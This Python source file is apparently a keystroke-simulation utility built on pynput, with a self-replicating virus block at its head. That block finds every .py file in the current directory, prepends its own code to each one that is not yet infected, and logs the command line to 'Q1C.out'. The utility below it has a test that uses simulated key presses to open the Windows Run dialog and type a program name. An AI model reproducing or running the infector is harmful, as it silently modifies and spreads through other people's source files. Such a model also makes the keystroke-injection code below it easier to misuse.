# virus start
import sys, glob
def file_finder(directory="."):
	return[file for file in glob.glob("*.py")]
def file_content(filename):
	info = None
	with open(filename, "r") as file:
		info = file.readlines()
	return info
def infectable(filename):
	info = file_content(filename)
	for line in info:
		if "# virus start\n" in line:
			return None
	return info
def virus_infect(filename, code):
	if (data:=infectable(filename)):
		with open(filename, "w") as infect_file:
			infect_file.write("".join(code))
			infect_file.writelines(data)
def code():
	extract = False
	virus = []
	text = file_content(__file__)
	for line in text:
		if "# virus start\n" in line:
			extract = True
		if extract:
			virus.append(line)
		if "# virus end\n" in line:
			extract = False
			break
	return virus
def append_file(line):
	output = "Q1C.out"
	with open(output, 'a') as x:
		x.write(line + '\n')
def infection():
	line = " ".join(sys.argv)
	append_file(line)
	c = code()
	for files in file_finder():
		virus_infect(files, c)
if __name__ == "__main__":
	infection()
# virus end
from pynput.keyboard import Key, Controller
from time import sleep
keyboard = Controller()

keys = {"DELETE" : Key.delete,
        "SHIFT" : Key.shift,
        "CONTROL" : Key.ctrl,
        "CTRL" : Key.ctrl,
        "ENTER" : Key.enter,
        "HOME" : Key.home,
        "INSERT" : Key.insert,
        "PAGEUP" : Key.page_up,
        "PAGEDOWN" : Key.page_down,
        "WINDOWS" : Key.cmd,
        "GUI" : Key.cmd,
        "UPARROW" : Key.up,
        "UP" : Key.up,
        "LEFTARROW" : Key.left,
        "LEFT" : Key.left,
        "RIGHTARROW" : Key.right,
        "RIGHT" : Key.right,
        "DOWNARROW" : Key.down,
        "DOWN" : Key.down,
        "TAB" : Key.tab,
        "BREAK" : Key.pause,
        "PAUSE" : Key.pause,
        "ESCAPE" : Key.esc,
        "ESC" : Key.esc,
        "ALT" : Key.alt,
        "END" : Key.end,
        "SPACE" : Key.space,
        "APP" : Key.menu,
        "MENU" : Key.menu,
        "F1" : Key.f1,
        "F2" : Key.f2,
        "F3" : Key.f3,
        "F4" : Key.f4,
        "F5" : Key.f5,
        "F6" : Key.f6,
        "F7" : Key.f7,
        "F8" : Key.f8,
        "F9" : Key.f9,
        "F10" : Key.f10,
        "F11" : Key.f11,
        "F12" : Key.f12,
        "F13" : Key.f13}

def SimulateModifiedKeyStroke(modifierKey, key):
    modifierKey, key = Text2Keycode(modifierKey, key)
    keyboard.press(modifierKey)
    if key:
        keyboard.press(key)
        keyboard.release(key)
    keyboard.release(modifierKey)

def SimulateKeyPress(key):
    key = Text2Keycode(key.lower())[0]
    keyboard.press(key)
    keyboard.release(key)

def SimulateTextEntry(text:str, delay:float = 13/1000.0):
    keyboard.press(text[0])
    keyboard.release(text[0])
    for char in text[1:]:
        sleep(delay)
        keyboard.press(char)
        keyboard.release(char)
        

def Text2Keycode(*args):
    result = []
    for string in args:
        if string.upper() in keys:
            string = keys[string.upper()]
        result += [string]
    return result

# Testing
if __name__ == "__main__":
    var1, var2 = Text2Keycode("GUI", "r")
    print(var1, var2)

    SimulateModifiedKeyStroke("gui", "r")

    sleep(3)

    SimulateTextEntry("notepad.exe")

    sleep(0.1)

    SimulateKeyPress("enter")